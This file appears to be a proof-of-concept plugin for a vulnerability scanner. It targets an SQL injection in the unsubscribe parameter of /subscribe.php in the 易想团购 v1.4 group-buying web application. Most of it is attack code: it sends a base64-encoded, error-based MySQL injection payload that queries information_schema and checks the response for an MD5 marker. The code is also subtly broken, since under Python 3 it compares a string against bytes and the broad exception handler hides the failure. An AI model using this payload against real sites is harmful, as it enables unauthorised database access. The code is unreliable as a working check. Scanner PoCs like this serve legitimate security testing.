# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'YXTG_0008'  # 平台漏洞编号，留空
    name = '易想团购 v1.4 /subscribe.php unsubscribe参数 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-09'  # 漏洞公布时间
    desc = '''
        易想团购 v1.4 /subscribe.php unsubscribe参数 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '易想团购'  # 漏洞应用名称
    product_version = '1.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cd2187c8-5345-463f-b76a-6d975a5041ee'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/subscribe.php?act=unsubscribe&code=YScgYW5kKHNlbGVjdCAxIGZyb20oc2VsZWN0IGNvdW50K"
                       "CopLGNvbmNhdCgoc2VsZWN0IChzZWxlY3QgKHNlbGVjdCBjb25jYXQoMHg3ZSxtZDUoNjY2KSwweDdlKS"
                       "kpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBsaW1pdCAwLDEpLGZsb29yKHJhbmQoMCkqMik"
                       "peCBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgZ3JvdXAgYnkgeClhKSM=")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if 'fae0b27c451c728867a567e8c1bb4e53' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
